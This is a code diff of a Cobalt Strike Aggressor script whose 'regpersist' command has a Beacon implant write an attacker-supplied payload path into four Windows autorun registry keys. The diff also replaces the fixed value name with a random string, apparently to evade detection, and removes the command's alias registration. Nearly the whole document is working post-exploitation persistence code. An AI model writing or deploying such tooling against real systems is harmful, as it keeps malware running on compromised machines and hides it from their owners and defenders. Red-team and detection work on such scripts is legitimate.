@@ -1,39 +1,40 @@
+sub random_string {
+	local('$length $charset $result $i');
+	$length = 6; # change length as desired
+	$charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+	$result = "";
+
+	for ($i = 0; $i < $length; $i++) {
+		$result .= substr($charset, rand(size($charset)), 1);
+	}
+	return $result;
+}
+
 sub regpersist {
-	local('$command $input');
+	local('$command $input $randval');
 
 	btask($1, "Tasked Beacon to add registry persistence keys");
 
 	$input = $2;
+	$randval = random_string();
 
 	btask($1, "Adding Registry Key: Run");
-	$command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v CRTO /t REG_SZ /d \"$input\"";
+	$command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v $randval /t REG_SZ /d \"$input\"";
 	btask($1, $command);
 	bshell($1, $command);
 
 	btask($1, "Adding Registry Key: RunOnce");
-	$command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v CRTO /t REG_SZ /d \"$input\"";
+	$command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v $randval /t REG_SZ /d \"$input\"";
 	btask($1, $command);
 	bshell($1, $command);
 
 	btask($1, "Adding Registry Key: RunServices");
-	$command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v CRTO /t REG_SZ /d \"$input\"";
+	$command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v $randval /t REG_SZ /d \"$input\"";
 	btask($1, $command);
 	bshell($1, $command);
 
 	btask($1, "Adding Registry Key: RunServicesOnce");
-	$command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v CRTO /t REG_SZ /d \"$input\"";
+	$command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v $randval /t REG_SZ /d \"$input\"";
 	btask($1, $command);
 	bshell($1, $command);
-}
-
-beacon_command_register("regpersist", "Add registry persistence keys",
-	"Synopsis: regpersist <implant_location>\n\n" .
-	"Adds multiple registry keys for persistence with the specified payload.");
-
-alias regpersist {
-	if ($2 is $null) {
-		berror($1, "No payload specified");
-	} else {
-		regpersist($1, $2);
-	}
 }
